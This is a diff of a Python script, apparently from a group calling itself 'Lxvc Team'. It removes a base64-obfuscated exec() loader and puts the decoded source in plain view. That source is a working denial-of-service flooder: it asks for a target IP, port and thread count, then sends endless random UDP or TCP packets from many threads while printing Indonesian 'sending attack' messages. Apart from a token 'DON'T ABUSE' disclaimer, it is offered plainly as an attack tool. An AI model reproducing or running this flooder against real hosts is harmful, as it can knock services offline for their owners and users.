@@ -1,6 +1,52 @@
-#DDOS TOOLS LxvcTeam
-#DON'T ABUSE 
-#SAYA TIDAK BERTANGGUNG JAWAB JIKA DISALAHGUNAKAN
-#CIEE MAU MALING TOOLS GA BISA AWOKAWOK
-import base64
-exec(base64.b64decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KI1Rvb2xzIGJ5IEx4dmMgVGVhbQ0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHRocmVhZGluZw0KDQpwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikNCnByaW50KCIgPj4gICBUb29scyBDcmVhdGVkIEJ5IEx4dmMgVGVhbSA8PCIpDQpwcmludCgiID4+ICAgRGlzY29yZCA6IFVua25vdyMxNzE2ICAgICAgPDwiKQ0KcHJpbnQoIiA+PiAgIE5PVEUgOiBET04nVCBBQlVTRSEhICAgICAgIDw8IikNCnByaW50KCIgPj4gICAjU0FZQSBCVUtBTiBIRU5HS0VSICA8PCIpDQpwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikNCmlwID0gc3RyKGlucHV0KCIgSVAgVEFSR0VUOiIpKQ0KcG9ydCA9IGludChpbnB1dCgiIFBPUlQ6IikpDQpjaG9pY2UgPSBzdHIoaW5wdXQoIiBHYXMgRERvUz8gKHkvbik6IikpDQp0aW1lcyA9IGludChpbnB1dCgiIFBhY2tldHMgcGVyIG9uZSBjb25uZWN0aW9uOiIpKQ0KdGhyZWFkcyA9IGludChpbnB1dCgiIFRIUkVBRFM6IikpDQpkZWYgcnVuKCk6DQoJZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxMDI0KQ0KCWkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpDQoJd2hpbGUgVHJ1ZToNCgkJdHJ5Og0KCQkJcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQ0KCQkJYWRkciA9IChzdHIoaXApLGludChwb3J0KSkNCgkJCWZvciB4IGluIHJhbmdlKHRpbWVzKToNCgkJCQlzLnNlbmR0byhkYXRhLGFkZHIpDQoJCQlwcmludChpICsiIExYVkMgVEVBTSB8IE1FTkdJUklNIFNFUkFOR0FOISEhIikNCgkJZXhjZXB0Og0KCQkJcHJpbnQoIlshXSBFUlJPUiIpDQoNCmRlZiBydW4yKCk6DQoJZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxNikNCglpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQ0KCXdoaWxlIFRydWU6DQoJCXRyeToNCgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQoJCQlzLmNvbm5lY3QoKGlwLHBvcnQpKQ0KCQkJcy5zZW5kKGRhdGEpDQoJCQlmb3IgeCBpbiByYW5nZSh0aW1lcyk6DQoJCQkJcy5zZW5kKGRhdGEpDQoJCQlwcmludChpICsiIExYVkMgVEVBTSB8IE1FTkdJUklNIFNFUkFOR0FOISEhIikNCgkJZXhjZXB0Og0KCQkJcy5jbG9zZSgpDQoJCQlwcmludCgiWypdIEVSUk9SIikNCg0KZm9yIHkgaW4gcmFuZ2UodGhyZWFkcyk6DQoJaWYgY2hvaWNlID09ICd5JzoNCgkJdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bikNCgkJdGguc3RhcnQoKQ0KCWVsc2U6DQoJCXRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4yKQ0KCQl0aC5zdGFydCgp"))
+#!/usr/bin/env python3
+#Tools by Lxvc Team
+import random
+import socket
+import threading
+
+print("------------------------------------------------------------")
+print(" >>   Tools Created By Lxvc Team <<")
+print(" >>   Discord : Unknow#1716      <<")
+print(" >>   NOTE : DON'T ABUSE!!       <<")
+print(" >>   #BUKAN HENGKER.            <<")
+print("------------------------------------------------------------")
+ip = str(input(" IP TARGET:"))
+port = int(input(" PORT:"))
+choice = str(input(" Gas DDoS? (y/n):"))
+times = int(input(" Packets per one connection:"))
+threads = int(input(" THREADS:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" LXVC TEAM | MENGIRIM SERANGAN!!!")
+		except:
+			print("[!] ERROR")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" LXVC TEAM | MENGIRIM SERANGAN!!!")
+		except:
+			s.close()
+			print("[*] ERROR")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
